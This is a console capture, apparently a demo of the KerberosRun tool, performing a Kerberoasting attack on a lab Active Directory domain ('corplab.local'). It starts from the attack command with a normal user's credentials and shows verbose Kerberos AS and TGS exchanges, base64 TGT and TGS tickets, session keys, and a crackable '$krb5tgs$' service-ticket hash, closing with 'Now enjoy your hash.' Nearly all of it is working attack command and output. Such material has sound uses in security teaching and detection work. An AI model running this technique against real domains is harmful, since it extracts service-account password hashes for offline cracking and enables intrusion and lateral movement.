```powershell
PS C:\Users> .\KerberosRun.exe --kerberoast --user normaluser --pass [...] --spn time/win10.corplab.local --verbose

   __           __
  / /_____ ____/ /  ___ _______  ___ ______ _____
 /  '_/ -_) __/ _ \/ -_) __/ _ \(_-</ __/ // / _ \
/_/\_\\__/_/ /_.__/\__/_/  \___/___/_/  \_,_/_//_/

  v1.0.0
[*] Starting Kerberos Authentication ...
[*] Sending AS-REQ ...
    * MessageType :  KRB_AS_REQ
    * pvno :  5
    * PaData :
       - PA_PAC_REQUEST :
          - IncludePac :  True
    * Body :
       - KdcOptions :  RenewableOk, Canonicalize, Renewable, Forwardable
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  normaluser
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :  9/13/2037 2:48:05 AM +00:00
       - Nonce :  637261654
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - Addresses :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - AdditionalTickets :
       - EncAuthorizationData :
       - From :
[*] Sending AS-REQ ...
    * MessageType :  KRB_AS_REQ
    * pvno :  5
    * PaData :
       - PA_PAC_REQUEST :
          - IncludePac :  True
    * Body :
       - KdcOptions :  RenewableOk, Canonicalize, Renewable, Forwardable
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  normaluser
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :  9/13/2037 2:48:05 AM +00:00
       - Nonce :  637261655
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - Addresses :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - AdditionalTickets :
       - EncAuthorizationData :
       - From :
[*] Receiving AS-REP...
    * MessageType :  KRB_AS_REP
    * pvno :  5
    * PaData :
       - PA_ETYPE_INFO2 :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - S2kParams :
          - Salt :  CORPLAB.LOCALnormaluser
    * CRealm :  CORPLAB.LOCAL
    * CName :
       - Type :  NT_PRINCIPAL
       - Name :  normaluser
    * Ticket :
       - tkt-vno :  5
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Name :  krbtgt
          - Type :  NT_SRV_INST
       - EncryptedPart :
          - kvno :  11
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Cipher :  [krbtgtEncryptedCipher...]
    * Enc-Part :
       - kvno :  6
       - EType :  AES256_CTS_HMAC_SHA1_96
       - Cipher :  [ClientEncryptedCipher...]
[+] TGT Kirbi:
    - doIFHDCCBRigAwIBBaEDAgEWooIEHDCCBBhhggQUMIIEEKADAgEFoQ8bDUNPUlBMQUIuTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDUNPUlBMQUIuTE9DQUyjggPSMIIDzqADAgESoQMCAQuiggPABIIDvKgwU3Uw2GAEBrfsxkiO7dC96zU75hz/eieHDv7PuJVeZk818/uCowvdeD6owsHYqq05Ju1vmJgDOOKZscQzerxIRpoikQp0LR6qw19lRRc4TRdPbYgjbIT5Ww+BPknPR70kcVq7lZQ9zIwKFHkBrVTKROzEOQDAdENvcQM18qqVFB4xXUmCkIAdxj899JwU/VlZxZk1jS6coyieP89UOg1C3LCq8wYGhLUuxQMahQP4sWiGzsUsVJz/YWkTR1yAibVSq7krVxeIYnK9hilvBDDOJa6PusSGWRxFFFFsLCJbnY+hk6J0tyJyhVKYDsQz+kfC3Uu5yB4GV8wucA357zMHSAcuKL3gS0IGzNWS0+qATkrVkHfMNWSicCw2ZkoFjotLDxedqvQIuXnwJHMU1RSrIUYOEn/+S+Y1CCPjhzYgUaU4lz6de/i2SLaYHVP15fcOOsUnDsLeJWdmwXSYzzhjCRjOBdm8xq0+s0LrR56Sa2zTW7432U/96XeznojWPnJOt/Isw/6sK0YpeX5wBMDh+n+ckRooMleuslS/uE3c/l3AVdeQayXvRquacNVIJSOzl3aN49GDe8z2+omemQNKlqgGvsbxlwBjFwExtZ5DWTrvvSeChd2Or52xu51HfpExSvOOfuj5mLotbsNjBsjx9sFn9SqIlCgztfzxMDj2ksT3fexL4F56hvqZHTs+DrbZ5eBPF4exdDMXx8eVz5SdEsBxe+rpxiywjqpWefQOqWczptm4I8YYMA3zgmaXSmevNBE9ZcmruO5J1T2aZ7Ds9OIHuu8wzI9hlviHAOZRpRS+oAdTOQhzrj3pkIotBTRC8ui/L1ZcMgrvJmP9MxXMIpjBhwMhRWDBoOxmccljMPwyefaEuXvPIQjqu7fz6ZdJpD5Jer38Vh/Hm38btTj+xPuTwKJt11k3eGT2mt6AIp5/se2kD2ngRNbYZ1Cth/+tjZGvsIgnuYhEK+GlTr1mctk8lS8B6x91kYlvDcPPcPT/evZTR0Knz0LV0PIYDY6yWLbeLnJsILSBMiqLanOa2V6GEh2VfESrt5bZjMe09o+5lLpJOhKVwwl2owQouqXIaMrQ+GETocmK1PuIVdzcEO/2e61hxntdA7jUA8di39pBsgRbiYo3Z5mj9dxjUs4iMdMEAOBYXz24MlX9GEz0tg6ESb78yXhXVs8+Om12iFJpkYt2XEA0lTgq/HT4iqHQAISOMKsi7Ea1sDLSGHiWe/PXh/aJcJ6CwouNjzU+3kZR77gSSDCQV4WLo4HrMIHooAMCAQCigeAEgd19gdowgdeggdQwgdEwgc6gKzApoAMCARKhIgQg7sY+Amc6KpoQ7LwRT5OL9iaRdK92Bd0hCewFSK6gvXShDxsNQ09SUExBQi5MT0NBTKIXMBWgAwIBAaEOMAwbCm5vcm1hbHVzZXKjBwMFAEDBAAClERgPMjAyMDA1MjcwODM1NDRaphEYDzIwMjAwNTI3MTgzNTQ0WqcRGA8yMDIwMDYwMzA4MzU0NFqoDxsNQ09SUExBQi5MT0NBTKkiMCCgAwIBAqEZMBcbBmtyYnRndBsNQ09SUExBQi5MT0NBTA==
[*] Sending TGS-REQ ...
    * MessageType :  KRB_TGS_REQ
    * pvno :  5
    * PaData :
       - PA_TGS_REQ :
          - KRB_AP_REQ :
             - pvno :  5
             - ApOptions :  Reserved
             - Ticket :
                - tkt-vno :  5
                - Realm :  CORPLAB.LOCAL
                - SName :
                   - Type :  NT_SRV_INST
                   - Name :  krbtgt
                   - Name :  CORPLAB.LOCAL
                - EncryptedPart :
                   - kvno :  11
                   - EType :  AES256_CTS_HMAC_SHA1_96
                   - Cipher :  [krbtgtEncryptedCipher...]
             - Authenticator :
                - kvno :
                - EType :  AES256_CTS_HMAC_SHA1_96
                - Realm :  CORPLAB.LOCAL
                - SequenceNumber :  637261657
                - Subkey :
                   - EType :  AES256_CTS_HMAC_SHA1_96
                   - KeyValue :  DE60412E51655270CE5AE28FACA042A371ACC4D86F2B50151CAD82593DC16205
                - CTime :  5/27/2020 8:35:44 AM +00:00
                - CuSec :  607
                - CName :
                   - Type :  NT_PRINCIPAL
                   - Name :  normaluser
                - Checksum :
                   - Type :  HMAC_SHA1_96_AES256
                   - Checksum :  8EDD9072494F2981798F23A7
                - AuthorizationData :
                - AuthenticatorVersionNumber :  5
       - PA_PAC_OPTIONS :
          - Flags :  BranchAware
    * Body :
       - KdcOptions :  RenewableOk, Canonicalize, Renewable, Forwardable
       - Realm :  corplab.local
       - SName :
          - Type :  NT_SRV_INST
          - Name :  time
          - Name :  win10.corplab.local
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :
       - Nonce :  637261656
       - EType :
          - EncType :  RC4_HMAC_NT
       - EncAuthorizationData :
       - From :
       - AdditionalTickets :
[*] Receiving TGS-REP ...
    * MessageType :  KRB_TGS_REP
    * pvno :  5
    * PaData :
    * CRealm :  CORPLAB.LOCAL
    * CName :
       - Type :  NT_PRINCIPAL
       - Name :  normaluser
    * Ticket :
       - tkt-vno :  5
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Name :  time
          - Type :  NT_SRV_INST
       - EncryptedPart :
          - kvno :  5
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Cipher :  [ServiceEncryptedCipher...]
    * Enc-Part :
       - EType :  AES256_CTS_HMAC_SHA1_96
       - kvno :
       - Cipher :  [SubSessionKeyEncryptedCipher..]
    * [Decrypted Enc-Part]:
       - AuthTime :  5/27/2020 8:35:44 AM +00:00
       - StartTime :  5/27/2020 8:35:44 AM +00:00
       - EndTime :  5/27/2020 6:35:44 PM +00:00
       - RenewTill :  6/3/2020 8:35:44 AM +00:00
       - Nonce :  637261656
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  time
          - Name :  win10.corplab.local
       - EncryptedPaData :
          - PA_SUPPORTED_ETYPES :
             - Value : 1F000000
          - PA_PAC_OPTIONS :
             - Flags :  BranchAware
       - Key :
          - EType :  RC4_HMAC_NT
          - Value :  81DBE44422621BBDBEB4EEBFB72B92BA
       - KeyExpiration :
       - Flags :  EncryptedPreAuthentication, Renewable, Forwardable
       - LastReq
          - Type :  0
          - Type :  5/27/2020 8:35:44 AM +00:00
[+] TGS Kirbi:
    - doIFBDCCBQCgAwIBBaEDAgEWooIEEDCCBAxhggQIMIIEBKADAgEFoQ8bDUNPUlBMQUIuTE9DQUyiJjAkoAMCAQKhHTAbGwR0aW1lGxN3aW4xMC5jb3JwbGFiLmxvY2Fso4IDwjCCA76gAwIBEqEDAgEFooIDsASCA6witQMKXQl+xCRO96HZ7ew8L78k8f9vbViK5/pEamEK7O5jk5g1oG921hyZR3b2wkVr8kyWxva9KbrWvpWpDJYrikje4NlvS2L+wFGb1NRDA4ooIckhK0nTWNVcfhbsrD/VEcPVmo/B2NDawiqQiyElWMTZT7nVZYD3bB2emFolqjjW0dQ6/NnA3/mgKwB0utzaVviTz3Cjg5u/8e5u+Aascoswcp5WHNELiaUhNdwKM6MkYDhoOpHZO05LkcFjuSYKhUeUvQq6IKkerRPwcR10Q8xS4PnHRU90Y+MQpwrbfrut3udU0EhZnA4Y2Pi6TXDdgiaXUr2N/uiJy6XiONcvDWrECCfsN+Ci3Lj9N+fmq02UkANZWbdh4CGXn9lnz0LbrYqhmCzxtQ/zwItJ+Vhj/tPxjQZrS9t1z8P4b5UAzUbHHCo+oufyA2aCHMkxBJTR23lsGZKbVUh4x9XnrGfwp7ZGZ3TB0ffie4+/DZFC3K0sU1yd6dCHLF8bSYJ8VMsPyMPCF9fD243IetaAaLSdZHaEMAK+h+4qfLwm/ZPFtqTYNapSD5gQQZYh2myfi+C2FcF10Nhuxl9WZVFWbWsnLpJpjqgFz8WoDPwtufoqlnO3Vy8sscD6GAFVLp4ux53UklIpo2hmkUHuMiXUDVmhUpqIpID4opwJzMoBxv6D1O/zSeGI1ax7uKvx3MjnpB2G+M8gI/M/gx5RfMdwVbkVVqSu3taLc8udqMjgCYY48MVJf/2nLcgwuo1+H8yRD/lw/DnrtRjooOSblk57U3sPYC3h//b5/8TWnAckoCqZj+UlxAFOn8crycwWlQCWZ4bUEVTbbYs69JuG78wv0dRDSQc0nViYNuSplecUxEb6MjHg9J8MMWyfsOYhN1n0vSsLa3DPmSyJStwS9Gis3z5Es9mxY3NK9J2gdF9KupzNUsSbH+RXpB3oB1KqvwvKgdlhkDyYixtI6A4Yg+t1lDWxExVk4QYdqGIDCw/+kAU4I2k891uNrFsnDe9n5AD2OEQVwCEuF1MsDnLWm3ovpVqGJzR8IP7txyDfSp4zWt4P4n4FaVGeVHhYkWDbiFIDQ8VclUd8Nf02Ajq8HH0KIf83s54SjzzEfYjzYcKSzPOVCICpvdvtM50S6d616tp7C61OOou5V+QHZpjGr9OG89axOjkcfQc7xtkkjUY/dgsWkVG5SwK7vAj6p7UQICJmgGGIl56mHIPlFp7C+aq6VBJckgfph1iAy/KGWQXPo4HfMIHcoAMCAQCigdQEgdF9gc4wgcuggcgwgcUwgcKgGzAZoAMCARehEgQQgdvkRCJiG72+tO6/tyuSuqEPGw1DT1JQTEFCLkxPQ0FMohcwFaADAgEBoQ4wDBsKbm9ybWFsdXNlcqMHAwUAQIEAAKURGA8yMDIwMDUyNzA4MzU0NFqmERgPMjAyMDA1MjcxODM1NDRapxEYDzIwMjAwNjAzMDgzNTQ0WqgPGw1DT1JQTEFCLkxPQ0FMqSYwJKADAgECoR0wGxsEdGltZRsTd2luMTAuY29ycGxhYi5sb2NhbA==
[+] Kerberoasting Hash: $krb5tgs$18$*normaluser$corplab.local$time/win10.corplab.local*$22B5030A5D097EC4244EF7A1D9EDEC3C$2FBF24F1FF6F6D588AE7FA446A610AECEE63939835A06F76D61C994776F6C2456BF24C96C6F6BD29BAD6BE95A90C962B8A48DEE0D96F4B62FEC0519BD4D443038A2821C9212B49D358D55C7E16ECAC3FD511C3D59A8FC1D8D0DAC22A908B212558C4D94FB9D56580F76C1D9E985A25AA38D6D1D43AFCD9C0DFF9A02B0074BADCDA56F893CF70A3839BBFF1EE6EF806AC728B30729E561CD10B89A52135DC0A33A3246038683A91D93B4E4B91C163B9260A854794BD0ABA20A91EAD13F0711D7443CC52E0F9C7454F7463E310A70ADB7EBBADDEE754D048599C0E18D8F8BA4D70DD82269752BD8DFEE889CBA5E238D72F0D6AC40827EC37E0A2DCB8FD37E7E6AB4D9490035959B761E021979FD967CF42DBAD8AA1982CF1B50FF3C08B49F95863FED3F18D066B4BDB75CFC3F86F9500CD46C71C2A3EA2E7F20366821CC9310494D1DB796C19929B554878C7D5E7AC67F0A7B6466774C1D1F7E27B8FBF0D9142DCAD2C535C9DE9D0872C5F1B49827C54CB0FC8C3C217D7C3DB8DC87AD68068B49D6476843002BE87EE2A7CBC26FD93C5B6A4D835AA520F9810419621DA6C9F8BE0B615C175D0D86EC65F566551566D6B272E92698EA805CFC5A80CFC2DB9FA2A9673B7572F2CB1C0FA1801552E9E2EC79DD4925229A368669141EE3225D40D59A1529A88A480F8A29C09CCCA01C6FE83D4EFF349E188D5AC7BB8ABF1DCC8E7A41D86F8CF2023F33F831E517CC77055B91556A4AEDED68B73CB9DA8C8E0098638F0C5497FFDA72DC830BA8D7E1FCC910FF970FC39EBB518E8A0E49B964E7B537B0F602DE1FFF6F9FFC4D69C0724A02A998FE525C4014E9FC72BC9CC169500966786D41154DB6D8B3AF49B86EFCC2FD1D4434907349D589836E4A995E714C446FA3231E0F49F0C316C9FB0E6213759F4BD2B0B6B70CF992C894ADC12F468ACDF3E44B3D9B163734AF49DA0745F4ABA9CCD52C49B1FE457A41DE80752AABF0BCA81D961903C988B1B48E80E1883EB759435B1131564E1061DA862030B0FFE90053823693CF75B8DAC5B270DEF67E400F6384415C0212E17532C0E72D69B7A2FA55A8627347C20FEEDC720DF4A9E335ADE0FE27E0569519E5478589160DB88520343C55C95477C35FD36023ABC1C7D0A21FF37B39E128F3CC47D88F361C292CCF3950880A9BDDBED339D12E9DEB5EADA7B0BAD4E3A8BB957E4076698C6AFD386F3D6B13A391C7D073BC6D9248D463F760B169151B94B02BBBC08FAA7B510202266806188979EA61C83E5169EC2F9AABA54125C9207E9875880CBF2865905CF
[+] Done! Now enjoy your hash.
```